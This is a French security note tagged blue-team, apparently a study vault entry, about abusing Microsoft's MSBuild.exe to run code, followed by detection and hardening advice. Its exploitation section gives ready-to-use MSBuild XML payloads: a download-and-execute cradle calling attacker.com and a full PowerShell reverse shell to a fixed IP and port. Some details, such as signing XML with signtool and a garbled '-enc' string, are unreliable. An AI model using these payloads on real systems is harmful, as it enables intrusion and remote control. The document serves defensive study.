---
tags:
  - blue-team
  - defense
  - domain/processus-moteur
---

# MSBuild — Microsoft Build Engine Exploitation

## C'est quoi

**MSBuild** (Microsoft Build Engine) est le moteur de compilation officiel de Visual Studio utilisé pour compiler des projets .NET. C'est un **living-off-the-land binary** : un outil légitime Microsoft qu'on détourne pour exécuter du code arbitraire.

**Intérêt attaquant** :
- `MSBuild.exe` est **signé Microsoft** → passe sous le radar des listes blanches
- Accepte des fichiers **XML malveillants** contenant du C# ou PowerShell
- Exécute le code avec les privilèges de l'utilisateur qui lance MSBuild
- Peu d'EDR/AV alertent sur MSBuild (c'est censé être normal)

**Technique MITRE** : T1127 (Indirect Command Execution) ou T1202 (Indirect Command Execution via scripting)

---

## Énumération

### Localiser MSBuild

```bash
# Chemin standard Windows (peut varier selon version Visual Studio)
"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"

# Aussi souvent présent dans :
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"

# Chercher :
Get-Command msbuild
where.exe msbuild
```

### Vérifier la présence via PowerShell

```powershell
Test-Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"

# Si True = MSBuild disponible
```

---

## Exploitation — Exécution de code via XML

### Cas 1 : Créer un projet MSBuild qui exécute PowerShell

Crée un fichier `project.xml` :

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="pwn">
    <Exec Command="powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Write-Host 'Hello from MSBuild'" />
  </Target>
</Project>
```

Exécuter :

```bash
MSBuild.exe project.xml
```

Résultat : le code PowerShell s'exécute.

### Cas 2 : Télécharger et exécuter un script distant

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Download">
    <Exec Command="powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" />
  </Target>
</Project>
```

### Cas 3 : Reverse shell

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Shell">
    <Exec Command="powershell.exe -NoProfile -Command $client = New-Object System.Net.Sockets.TcpClient('192.168.1.10',4444); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535 | ForEach-Object {0}; while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) { $command = ([text.encoding]::UTF8).GetString($buffer, 0, $i); $output = (Invoke-Expression $command 2>&amp;1 | Out-String); $stream.Write(([text.encoding]::UTF8).GetBytes($output), 0, $output.Length); }" />
  </Target>
</Project>
```

---

## Exploitation avancée — Compiler du C# malveillant

MSBuild peut aussi **compiler et exécuter du C#** directement :

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <Csc Sources="malicious.cs" OutputAssembly="output.exe" TargetType="exe" />
  </Target>
</Project>
```

Créer `malicious.cs` :

```csharp
using System;
class Program
{
    static void Main()
    {
        System.Diagnostics.Process.Start("cmd.exe", "/c calc.exe");
    }
}
```

Exécuter :

```bash
MSBuild.exe project.xml
./output.exe
```

---

## Cas d'attaque réels

### HTB Exploitation

Typiquement tu trouves :
1. Un `project.xml` ou `.csproj` malveillant laissé par l'attaquant
2. Le serveur la bâtisse via une pipeline (GitHub Actions, Azure Pipelines, Jenkins, etc.)
3. Le code s'exécute pendant le build avec des privilèges élevés (souvent SYSTEM en CI/CD)

Exemple Github Actions :

```yaml
- name: Build Project
  run: msbuild Project.xml
```

Si `Project.xml` contient une commande malveillante, elle s'exécute côté serveur CI/CD.

---

## Détection

### En tant que défenseur

**Event ID 4688** (Process Creation) :

Chercher :
```
Image: *\MSBuild.exe
CommandLine: *project.xml* OR *payload.xml* OR *.csproj*
```

Ou chercher des **children** suspects de MSBuild :

```powershell
Get-WinEvent -FilterHashtable @{ID=4688} |
Where-Object {$_.Message -like "*MSBuild*" -and $_.Message -like "*powershell*"}
```

**Sysmon Event ID 1** :

```
ParentImage: *MSBuild.exe
Image: powershell.exe OR cmd.exe OR certutil.exe
```

MSBuild qui crée des processus enfants = très suspect (MSBuild ne devrait lancer que des compilations).

### IOCs

```
*.xml files avec :
  - <Exec Command="powershell" />
  - <Exec Command="cmd" />
  - <Csc /> compilant du C# anormal

MSBuild.exe lancé depuis :
  - Répertoire utilisateur (Desktop, Downloads, Temp)
  - Sans argument de projet légitime
  - Avec arguments PowerShell "-enc" ou "-enc omm and"
```

---

## Défense

### Hardening Windows

```powershell
# Bloquer MSBuild via AppLocker
# Ajouter MSBuild.exe à la liste noire d'exécutables autorisés
# (sauf si le projet en a besoin)

# Ou via GPO :
# Policies > Windows Settings > Security Settings > 
# Application Control Policies > AppLocker > Executable Rules
```

### Détection via EDR

Configurer l'EDR pour alerter sur :
- MSBuild.exe création de processus enfants (powershell, cmd)
- MSBuild.exe chargement de modules suspects
- MSBuild.exe connexion réseau (MSBuild ne devrait pas faire ça)

### Bloquer les projets non signés

Forcer la signature des projets `.xml` / `.csproj` :

```bash
# Signer un projet
signtool sign /f certificate.pfx /p password project.xml

# Valider la signature avant compilation
Get-AuthenticodeSignature project.xml
```

---

## Outils & ressources

- MSBuild Microsoft : https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild
- MSBuild Tasks : https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-task-reference
- Living off the Land Binaries (LOLBins) : https://lolbas-project.github.io/ (MSBuild dedié)
- MITRE T1127 : https://attack.mitre.org/techniques/T1127/

---

## Points clés

- **Signé Microsoft** = bypass listes blanches
- **XML configurable** = exécute n'importe quoi
- **CI/CD = prédilection** : MesBuilder souvent autorisé dans pipelines
- **Peu d'alertes** : EDR/AV rarement ré-agissent sur MSBuild normal
- **Détection** : chercher MSBuild qui crée des processus enfants (anomalie)
